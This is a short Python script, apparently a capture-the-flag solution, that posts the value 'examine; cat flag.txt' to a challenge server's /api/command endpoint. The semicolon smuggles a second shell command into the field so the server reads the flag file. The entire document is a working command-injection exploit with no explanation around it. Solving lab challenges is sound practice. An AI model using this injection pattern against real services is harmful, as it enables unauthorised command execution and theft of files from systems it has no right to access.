import requests

url = "http://94.237.61.133:51853/api/command"
payload = "examine; cat flag.txt"

data = {"command": payload}
r = requests.post(url, json=data)
print(r.text)
